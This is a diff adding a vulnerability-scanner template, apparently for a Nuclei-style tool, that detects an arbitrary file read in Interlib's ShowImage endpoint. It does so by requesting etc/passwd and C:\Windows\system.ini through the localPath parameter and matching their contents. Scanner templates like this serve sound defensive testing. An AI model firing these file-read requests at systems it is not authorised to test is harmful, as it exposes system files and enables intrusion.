@@ -1,0 +1,29 @@
+id: interlib-fileread
+name: Interlib - Local File Inclusion
+severity: high
+confidence: tentative
+description: Interlib has an arbitrary file read vulnerability. Attackers can use the vulnerability to read any file.
+reference: CWE-22
+tags:
+- interlib
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /interlib/report/ShowImage?localPath=etc/passwd
+  matchers: &id001
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+    - for 16-bit app support
+  - type: header
+    words:
+    - image/jpg
+  - type: status
+    status:
+    - 200
+  condition: and
+- method: GET
+  path: /interlib/report/ShowImage?localPath=C:\Windows\system.ini
+  matchers: *id001
+  condition: and
